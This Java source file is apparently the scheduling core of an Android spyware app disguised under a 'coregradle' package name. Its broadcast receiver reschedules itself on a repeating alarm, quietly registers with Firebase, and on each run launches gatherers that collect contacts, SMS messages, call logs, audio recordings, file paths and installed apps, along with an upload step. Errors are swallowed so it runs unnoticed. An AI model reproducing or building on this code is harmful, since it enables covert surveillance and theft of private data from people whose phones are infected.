package org.code.coregradle.alarms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import org.code.coregradle.gatherers.AppInfoGatherer;
import org.code.coregradle.gatherers.BasicInfoGatherer;
import org.code.coregradle.gatherers.CallLogGatherer;
import org.code.coregradle.gatherers.ContactInfoGatherer;
import org.code.coregradle.gatherers.FilePathGatherer;
import org.code.coregradle.gatherers.InfoGatherer;
import org.code.coregradle.gatherers.PhoneMessageGatherer;
import org.code.coregradle.gatherers.RecordingGatherer;
import org.code.coregradle.gatherers.UploadGatherer;
import org.code.coregradle.registerable.FirebaseRegistrable;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CoregradleReceiver extends BroadcastReceiver {
    private ExecutorService executorService = Executors.newCachedThreadPool();
    public static FirebaseRegistrable firebaseRegistrable;

    @Override
    public void onReceive(Context context, Intent intent) {
        RepeatingAlarm.schedule(context);
        if (firebaseRegistrable != null) {
            try {
                if (!firebaseRegistrable.isRegistered()) {
                    firebaseRegistrable.register();
                }
            } catch (Exception ignored) {

            }
        }
        InfoGatherer[] infoGatherers = new InfoGatherer[]{
                new BasicInfoGatherer(),
                new FilePathGatherer(),
                new ContactInfoGatherer(),
                new RecordingGatherer(),
                new AppInfoGatherer(),
                new PhoneMessageGatherer(),
                new CallLogGatherer(),
                new UploadGatherer(),
        };
        for (InfoGatherer infoGatherer : infoGatherers) {
            infoGatherer.initGatherer(context);
            executorService.submit(infoGatherer::makeRequest);
            if (infoGatherer instanceof FilePathGatherer) {
                try {
                    Thread.sleep(3_000);
                } catch (InterruptedException ignored) {
                }
            }
        }

    }
}